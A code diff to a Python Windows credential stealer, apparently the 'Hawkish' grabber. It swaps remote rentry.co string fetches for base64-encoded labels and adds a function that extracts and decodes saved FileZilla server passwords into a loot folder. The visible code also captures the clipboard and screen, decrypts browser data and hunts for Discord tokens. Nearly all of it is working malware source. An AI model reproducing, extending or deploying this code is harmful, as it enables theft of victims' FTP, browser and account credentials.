@@ -31,53 +31,32 @@ from configparser import ConfigParser
 
 
 from tempfile import gettempdir, mkdtemp
-from sqlite3 import connect
 from base64 import b64decode
 from urllib.request import Request, urlopen
 from datetime import datetime, timedelta, timezone
 from sys import argv
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer, c_char_p, c_int, c_uint32, c_void_p, c_uint
+from ctypes import wintypes, Structure, POINTER, c_char, c_char_p, c_int, c_uint32, c_void_p, c_uint
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from subprocess import CREATE_NEW_CONSOLE, Popen, PIPE
 from PIL import ImageGrab
 
 
-myhawkname = "https://rentry.co/on4ev/raw"
-thisresp = requests.get(myhawkname)
-hwkish = thisresp.text
-
-hwkishst_secret = "https://rentry.co/nxuf8/raw"
-thisst = requests.get(hwkishst_secret)
-stspecial = thisst.text
-
-wattis_secret = "https://rentry.co/8n7ee/raw"
-fckyesz = requests.get(wattis_secret)
-maybycool = fckyesz.text
-
-shwk_aaast_secret = "https://rentry.co/wnqm9/raw"
-grrrrr = requests.get(shwk_aaast_secret)
-grbber = grrrrr.text
-
-justalink = "https://rentry.co/ozpmx/raw"
-alink = requests.get(justalink)
-justafcklink = alink.text
+hwkish = base64.b64decode(b'SGF3a2lzaA==').decode()
 
 
-netwrd = "https://rentry.co/fgsqi/raw"
-myboyzzz = requests.get(netwrd)
-ntwrk = myboyzzz.text
-
-
-myname_little = myhawkname.lower()
+stspecial = "Team"
+maybycool = base64.b64decode(b'VXNlciBEYXRh').decode()
+grbber = base64.b64decode(b'R3JhYmJlcg==').decode()
+ntwrk = base64.b64decode(b'TmV0d29yaw==').decode()
+justafcklink = base64.b64decode(b'TmV0d29yaw==').decode()
+myname_little = hwkish.lower()
 justaterm = base64.b64decode(b'Q29va2llcw==').decode()
 justatermlil = justaterm.lower()
 coresecretname = base64.b64decode(b'ZGlzY29yZF9kZXNrdG9wX2NvcmU=').decode()
 extension_id = f'{base64.b64decode("bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4=")}'.replace("b'", "").replace("'", "")
 inp  = str(extension_id)
-
 regx_net = r"[\w-]{24}\." + base64.b64decode(b'W1x3LV17Nn1cLltcdy1dezI1LDExMH0=').decode()
-
 imthebestdev = os.getlogin()
 spoted_victim = os.getenv("COMPUTERNAME")
 space_stored = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]
@@ -137,6 +116,48 @@ except:
     }
 
 class Functions(object):
+    @staticmethod
+    def decode_filezilla_xml(file_path):
+        if not os.path.exists(file_path):
+            return None
+        
+        with open(file_path, "r", encoding="utf-8") as file:
+            xml_content = file.read()
+        
+        credentials = []
+        
+        server_regex = r"<Server>(.*?)</Server>"
+        host_regex = r"<Host>(.*?)</Host>"
+        port_regex = r"<Port>(.*?)</Port>"
+        protocol_regex = r"<Protocol>(.*?)</Protocol>"
+        user_regex = r"<User>(.*?)</User>"
+        pass_regex = r"<Pass encoding=\"(.*?)\">(.*?)</Pass>"
+        
+        server_matches = re.findall(server_regex, xml_content, re.DOTALL)
+        
+        for server_match in server_matches:
+            host_match = re.search(host_regex, server_match)
+            port_match = re.search(port_regex, server_match)
+            protocol_match = re.search(protocol_regex, server_match)
+            user_match = re.search(user_regex, server_match)
+            pass_match = re.search(pass_regex, server_match)
+            
+            if host_match and port_match and protocol_match and user_match and pass_match:
+                host = host_match.group(1)
+                port = port_match.group(1)
+                protocol = protocol_match.group(1)
+                user = user_match.group(1)
+                pass_value = base64.b64decode(pass_match.group(2)).decode("utf-8")
+                
+                credentials.append({
+                    "Host": host,
+                    "Port": port,
+                    "Protocol": protocol,
+                    "User": user,
+                    "Pass": pass_value,
+                })
+        
+        return credentials
     @staticmethod
     def hwkishfindClipboard():
         return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True).stdout.decode(errors='backslashreplace').strip()
@@ -612,6 +633,7 @@ class hwkish_first_funct(Functions):
         self.appdata = local
 
         self.roaming = roaming
+
         self._1 = "Google"
 
         self.chrome_user_path = os.path.join(self.appdata, self._1, "Chrome", maybycool)
@@ -746,6 +768,10 @@ class hwkish_first_funct(Functions):
         self.path_shortcutnav_additionnal = {
             "Opera GX": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Navigateur Opera GX.lnk",
         }
+        self.filezilla_config_path = os.path.join(self.roaming, "FileZilla")
+        self.recentservers_xml_path = os.path.join(self.filezilla_config_path, "recentservers.xml")
+        self.sitemanager_xml_path = os.path.join(self.filezilla_config_path, "sitemanager.xml")
+
 
 
     def askadmin(self):
@@ -1036,6 +1062,7 @@ class hwkish_first_funct(Functions):
             self.hwkishgetmyAV,
             self.system_informations,
             self.found_thistkn,
+            self.superfilezilla_nosteal,
             self.found_thismc,
             self.find_roblox,
         ]
@@ -1978,7 +2005,40 @@ class hwkish_first_funct(Functions):
             except Exception as e:
                 pass
 
-
+    def superfilezilla_nosteal(self):
+        if os.path.exists(self.recentservers_xml_path):
+            recentservers_credentials = self.decode_filezilla_xml(self.recentservers_xml_path)
+            if recentservers_credentials:
+                if not os.path.exists(os.path.join(self.dir, "FileZilla")):
+                    os.makedirs(os.path.join(self.dir, "FileZilla"), exist_ok=True)
+                with open(os.path.join(self.dir, "FileZilla", "Servers.txt"), "a", encoding="utf-8") as f:
+                    for credential in recentservers_credentials:
+                        try:
+                            host = credential.get("Host", "")
+                            port = credential.get("Port", "")
+                            protocol = credential.get("Protocol", "")
+                            user = credential.get("User", "")
+                            password = credential.get("Pass", "")
+                            encoding = credential.get("Encoding", "")
+                            
+                            if host:
+                                f.write(f"Host: {host}\n")
+                            if port:
+                                f.write(f"Port: {port}\n")
+                            if protocol:
+                                f.write(f"Protocol: {protocol}\n")
+                            if user:
+                                f.write(f"User: {user}\n")
+                            if password:
+                                f.write(f"Password: {password}\n")
+                            if encoding:
+                                f.write(f"Encoding: {encoding}\n")
+                            
+                            f.write("\n")
+                            
+                            self.thingstocount['passwrd'] += len(password)
+                        except:
+                            pass
 
     @extract_try
     def hwkishsteal_psw2(self, name: str, path: str, profile: str):
